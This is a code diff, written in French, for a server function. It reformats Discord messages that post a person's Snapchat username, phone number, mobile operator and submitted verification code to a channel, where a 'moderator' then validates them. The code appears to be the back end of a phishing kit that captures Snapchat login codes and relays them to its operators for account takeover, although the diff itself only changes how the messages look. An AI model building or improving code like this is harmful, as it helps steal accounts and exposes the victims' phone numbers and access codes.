@@ -128,11 +128,32 @@ serve(async (req) => {
 
       const embed = {
         title: "📱 Nouvelle demande Snap+",
-        description: `👤 **Nom d'utilisateur:** ${username}\n\n📞 **Téléphone:** ${formatPhone(phone)}\n\n${operator.emoji} **Opérateur:** ${operator.name}`,
         color: 0xFFA500,
-        footer: { 
-          text: "⏳ En attente du code de vérification..."
+        thumbnail: {
+          url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
         },
+        fields: [
+          {
+            name: "👤 Nom d'utilisateur",
+            value: `\`${username}\``,
+            inline: true
+          },
+          {
+            name: "📞 Téléphone",
+            value: `\`${formatPhone(phone)}\``,
+            inline: true
+          },
+          {
+            name: `${operator.emoji} Opérateur`,
+            value: `**${operator.name}**`,
+            inline: true
+          }
+        ],
+        footer: { 
+          text: "⏳ En attente du code de vérification...",
+          icon_url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
+        },
+        timestamp: new Date().toISOString()
       };
 
       await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
@@ -173,11 +194,47 @@ serve(async (req) => {
 
       const embed = {
         title: "🔐 Code de vérification soumis",
-        description: `👤 **Nom d'utilisateur:** ${username}\n\n🔢 **Code saisi:** \`${code}\`\n\n📞 **Téléphone:** ${formatPhone(phone)}\n\n${operator.emoji} **Opérateur:** ${operator.name}\n\n📅 **Soumis à:** ${dateStr} ${timeStr}`,
         color: 0xFFA500,
-        footer: { 
-          text: "En attente de validation par un modérateur"
+        thumbnail: {
+          url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
         },
+        fields: [
+          {
+            name: "👤 Nom d'utilisateur",
+            value: `\`${username}\``,
+            inline: true
+          },
+          {
+            name: "🔢 Code saisi",
+            value: `\`\`\`${code}\`\`\``,
+            inline: true
+          },
+          {
+            name: "\u200B",
+            value: "\u200B",
+            inline: true
+          },
+          {
+            name: "📞 Téléphone",
+            value: `\`${formatPhone(phone)}\``,
+            inline: true
+          },
+          {
+            name: `${operator.emoji} Opérateur`,
+            value: `**${operator.name}**`,
+            inline: true
+          },
+          {
+            name: "📅 Soumis à",
+            value: `\`${dateStr} ${timeStr}\``,
+            inline: true
+          }
+        ],
+        footer: { 
+          text: "En attente de validation par un modérateur",
+          icon_url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
+        },
+        timestamp: new Date().toISOString()
       };
 
       const payload = {
